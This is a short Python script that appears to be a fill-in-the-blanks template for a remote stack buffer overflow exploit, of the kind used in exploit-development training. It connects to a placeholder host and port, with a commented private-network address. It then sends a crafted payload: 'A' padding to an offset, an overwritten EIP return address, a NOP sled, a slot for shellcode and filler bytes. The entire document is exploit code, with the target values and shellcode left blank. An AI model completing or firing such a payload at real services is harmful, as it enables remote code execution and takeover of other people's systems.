#!/usr/bin/python3.9

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("XX.XX.XX.XX", PORT#))
#s.connect(("192.168.1.132", 42424))

total_length = XXXX
offset = XXX
new_eip = struct.pack("<I", <jmp eip here>) #jump eip 
no_op = b"\x90" * 16

buf =  b""

                                                   
payload = [

	b"A" * offset,
	new_eip,
	no_op,
	buf,
	b"C"* (total_length - offset - len(new_eip) - len(no_op) - len(buf) ),
	b"\n"

]

payload = b"".join(payload)

s.send(payload)

s.close()

